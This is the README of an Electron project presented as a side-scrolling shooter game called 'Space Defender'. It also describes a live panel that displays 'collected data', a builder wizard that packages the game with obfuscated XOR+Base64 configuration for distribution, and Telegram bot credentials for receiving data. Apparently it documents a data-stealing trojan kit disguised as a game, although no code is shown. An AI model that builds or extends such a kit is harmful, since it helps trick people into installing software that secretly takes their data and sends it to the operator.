# Space Defender

A desktop game built with Electron and Canvas, bundled with a real-time monitoring panel and a build wizard for distribution.

## Features

- **Game** — side-scrolling shooter with diver (homing) and turret (shooting) enemies, weapon powerups, nebula background, boss flash effects, and touch/mouse virtual joystick controls
- **Panel** — SSE live dashboard showing collected data with search/filter, toast notifications, and connection indicator
- **Builder** — step-by-step GUI wizard to package the game with obfuscated configuration (XOR + Base64)

## Scripts

| Command | Description |
|---------|-------------|
| `npm start` | Launch the game |
| `npm run panel` | Start the monitoring panel on port 3456 |
| `npm run build` | Start the builder wizard on port 3457 |
| `npm run pack` | Package directly with @electron/packager |

## Setup

Copy `.env.example` to `.env` and fill in your Telegram credentials:

```
TGTOKEN=your_telegram_bot_token
TGCHAT=your_telegram_chat_id
PANEL_URL=http://localhost:3456
PANEL_PORT=3456
BUILDER_PORT=3457
```

## Tech Stack

Electron, Canvas 2D, SSE, dotenv, @electron/packager
